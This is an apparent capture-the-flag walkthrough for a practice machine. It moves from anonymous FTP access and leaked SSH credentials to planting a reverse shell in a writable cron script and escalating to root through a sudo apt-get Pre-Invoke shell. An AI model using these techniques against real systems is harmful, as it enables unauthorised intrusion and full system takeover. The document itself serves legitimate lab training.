## MI6configuration
```
MI6, the British secret service, usually has very strong configurations. However, we recently acquired the IP address to James Bond's computer. Can you hack in and prove that you're a better agent then 007?
```
## Initial Access
We'll start with an `nmap` scan against the machine:
```
$ nmap 192.168.21.175 
	Nmap scan report for 192.168.21.175
	Host is up (0.0010s latency).
	Not shown: 998 closed tcp ports (reset)
	PORT   STATE SERVICE
	21/tcp open  ftp
	22/tcp open  ssh
```
We can see that there are two services, FTP and SSH. One common misconfiguration with FTP is allowing anonymous login. This allows anyone to access the files on the FTP server. We can attempt this with the following command, and not inputting a password when prompted.
```
ftp anonymous@192.168.21.175
```
It logs us in! After logging in, we can list files with `ls`:
```
ftp> ls
229 Entering Extended Passive Mode (|||48565|)
150 Here comes the directory listing.
-r--r--r--    1 33       0              28 Jan 20 21:20 flag1.txt
-r--r--r--    1 1001     0              29 Jan 20 21:20 not_my_passwords.txt
226 Directory send OK.
```
We've found our first flag, and a suspicious file. We can download both of these files with the `get` command. 
```
$ cat not_my_passwords.txt:
	james_bond:imthebestAgent007
```
`not_my_passwords.txt` seems to have a pair of credentials for `james_bond`, which we can then try to use against the SSH server. 
```
$ ssh james_bond@192.168.21.175
	james_bond@mi6configuration:~$
```
We're in! The second flag is stored in `~/secret/flag2.txt`. 
## Lateral Movement
Our enumeration for lateral movement starts with finding what other users are present on the machine. One way we can do this is my seeing what directories are in `/home`.
```
james_bond@mi6configuration:~$ ls /home
	james_bond  q  Shared
```
We can note that another user, `q` is present on the machine. There is an interesting folder also there. Let's check the ownership, and maybe the contents.
```
james_bond@mi6configuration:/home$ ls -al Shared
	total 12
	dr-xr-x--- 2 q    agents 4096 Jan 20 21:20 .
	drwxr-xr-x 5 root root   4096 Jan 20 21:20 ..
	-rwxrw---- 1 q    agents  168 Jan 20 22:24 update.sh
```
There's a shell script owned by the same user, but also the `agents` group. Let's check the members of that group.
```
james_bond@mi6configuration:/home$ getent group agents
	agents:x:1001:q,james_bond
```
Because we are part of the group, we have read and write permissions over the file. Viewing the file contents will give us more insight into what it might be doing. 
```
james_bond@mi6configuration:/home/Shared$ cat update.sh 
	#!/bin/bash
	#This command will run every two minutes and scan for running processes
	#Doing so will protect us from being hacked
	#Please do not change this file
	ps -aux
```
It seems like the file is run by a `cron job` every two minutes. Because we have write access, we might be able to add our own logic to the script. Using [revshells.com](https://revshells.com), we can generate a `bash` reverse shell and add it to the bottom of the `update.sh` file.  After a little while, we get a shell back!
```
$ nc -lvnp 1337      
	listening on [any] 1337 ...
	connect to [192.168.21.180] from (UNKNOWN) [192.168.21.175] 38770
	sh: 0: can't access tty; job control turned off
	$ whoami
	q
```
## Privilege Escalation 
Now that we have access as the `q` user, we now begin enumeration again. A common first thing to check is `sudo` privileges. 
```
$ sudo -l
	User q may run the following commands on mi6configuration:
	    (ALL) NOPASSWD: /usr/bin/apt-get
```
`q` can run `apt-get` with `sudo` without a password! We can use the following resource, [GTFOBins](https://gtfobins.github.io/gtfobins/apt-get/) to exploit this configuration. 
```
$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
	whoami;id
	root
	uid=0(root) gid=0(root) groups=0(root)
```
